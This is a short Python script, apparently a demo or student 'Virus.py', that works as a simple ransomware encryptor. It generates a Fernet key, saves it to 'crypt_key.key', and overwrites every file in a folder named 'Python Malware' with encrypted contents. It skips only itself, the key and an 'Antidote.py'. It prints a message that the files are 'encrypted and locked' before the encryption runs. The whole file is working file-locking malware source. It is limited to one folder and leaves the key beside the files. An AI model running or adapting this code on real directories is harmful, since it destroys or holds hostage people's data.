#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet #symmetric encryption method, cannot use w/o encryption key; 128-bit AES

# Create an Encryption key; initialize an empty array
crypto_key = Fernet.generate_key()
all_files = []
os.chdir('Python Malware')

# Gather all files to encrypt; exclude Python script and encryption key files.
for file in os.listdir():
    if file == "Virus.py" or file == "crypt_key.key" or file == "Antidote.py":
        continue
    else:
        all_files.append(file)
    

print("All files have been encrypted and locked, see below:")
print(all_files)


# Use Encryption key and write to a ".key" file
with open("crypt_key.key", "wb") as keyfile:
    details = keyfile.write(crypto_key)

# Use Encryption key and encrypt all selected files
for selected_file in all_files:
    with open(selected_file, "rb") as sfile:
        fcontents = sfile.read()
        encry_contents = Fernet(crypto_key).encrypt(fcontents)
    with open(selected_file, "wb") as sfile:
        sfile.write(encry_contents)